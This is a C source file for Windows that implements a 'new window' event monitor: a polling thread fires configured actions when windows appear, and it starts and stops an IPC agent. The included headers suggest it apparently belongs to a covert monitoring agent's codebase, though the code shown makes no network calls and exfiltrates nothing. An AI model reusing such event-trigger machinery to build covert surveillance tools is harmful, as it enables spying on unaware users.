#include <Windows.h>
#include <json/JSON.h>
#include "../common.h"
#include "../bss.h"
#include "../H4-DLL.h"
#include "../SM_Core.h"
#include "../HM_SafeProcedures.h"
#include "../process.h"
#include "../AM_Core.h"
#include "../LOG.h"
#include "../SM_EventHandlers.h"

//---------------------------------------------------
// MONITOR NEW WINDOW

typedef struct {
	EVENT_PARAM event_param;
	DWORD event_id;
} monitor_newwindow_struct;

BOOL g_newwindow_created = FALSE; // Viene messa a TRUE dal dispatcher PM_NewWindowDispatch
DWORD em_newwindow_count = 0;
monitor_newwindow_struct* newwindow_table = NULL;
HANDLE em_mnw_thread = 0;
BOOL em_mnw_cp = FALSE;
#define EM_MNW_SLEEPTIME 300

DWORD MonitorNewWindowThread(DWORD dummy)
{
	LOOP{
		DWORD i;
		CANCELLATION_POINT(em_mnw_cp);

		// Viene messa a TRUE dal dispatcher PM_NewWindowDispatch
		if (g_newwindow_created) {
			g_newwindow_created = FALSE;
			for (i = 0; i < em_newwindow_count; i++)
				TriggerEvent(newwindow_table[i].event_param.start_action, newwindow_table[i].event_id);
		}
		Sleep(EM_MNW_SLEEPTIME);
	}
		// not reached
	return 0;
}

void WINAPI EM_NewWindowAdd(cJSON* conf_json, EVENT_PARAM* event_param, DWORD event_id)
{
	void* temp_table;

	if (!(temp_table = realloc(newwindow_table, (em_newwindow_count + 1) * sizeof(monitor_newwindow_struct))))
		return;

	newwindow_table = (monitor_newwindow_struct*)temp_table;
	memcpy(&newwindow_table[em_newwindow_count].event_param, event_param, sizeof(EVENT_PARAM));
	newwindow_table[em_newwindow_count].event_id = event_id;

	em_newwindow_count++;
}

void WINAPI EM_NewWindowStart()
{
	DWORD dummy;

	// Crea il thread solo se ci sono azioni da fare
	if (em_newwindow_count > 0) {
		em_mnw_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorNewWindowThread, NULL, 0, &dummy);
		AM_IPCAgentStartStop(PM_ONNEWWINDOW_IPC, TRUE);
	}
}


void WINAPI EM_NewWindowStop()
{
	AM_IPCAgentStartStop(PM_ONNEWWINDOW_IPC, FALSE);
	QUERY_CANCELLATION(em_mnw_thread, em_mnw_cp);
	SAFE_FREE(newwindow_table);
	em_newwindow_count = 0;
}
